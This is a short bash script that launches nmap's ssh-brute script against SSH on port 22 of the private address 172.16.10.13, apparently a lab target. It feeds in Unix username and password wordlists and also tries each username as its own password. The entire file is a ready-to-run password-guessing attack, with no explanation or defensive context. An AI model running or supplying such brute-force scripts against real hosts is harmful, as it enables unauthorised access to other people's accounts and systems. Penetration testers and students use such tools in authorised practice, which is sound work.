#! /bin/bash
# Wordlist files MUST be in the same directory!
# https://nmap.org/nsedoc/scripts/ssh-brute.html#usage
{
usernames_wl="unix_users.txt"
passwords_wl="unix_passwords.txt"
nmap --script ssh-brute \
  --script-args "userdb=$usernames_wl,passdb=$passwords_wl,useraspass,unique" \
  172.16.10.13 -p 22
}